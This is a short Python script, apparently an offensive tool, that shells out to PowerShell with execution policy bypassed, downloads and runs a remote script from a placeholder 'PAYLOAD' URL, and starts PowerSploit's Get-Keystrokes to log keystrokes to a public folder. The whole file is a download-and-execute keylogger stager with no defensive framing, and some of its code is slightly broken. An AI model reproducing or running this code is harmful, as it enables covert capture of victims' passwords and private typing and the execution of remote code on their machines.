import subprocess

# SOCKET RESPONSE FOR RAISED EXCEPTIONS??
def run_cmd(cmd):
    proc = subprocess.Popen(cmd, shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    errcode = proc.returncode
    if errcode is not None:
        raise Exception("[*] STATUS: cmd failed to execute")

powersploit_URL = 'PAYLOAD'
cmd_powersploit = ('powershell.exe -exec bypass IEX "(New-ObjectNet.WebClient).DownloadString(\'%s\');'
                  'Get-Keystrokes -LogPath C:\\Users\\Public\\key.log"' %powersploit_URL)

run_cmd(cmd_powersploit)
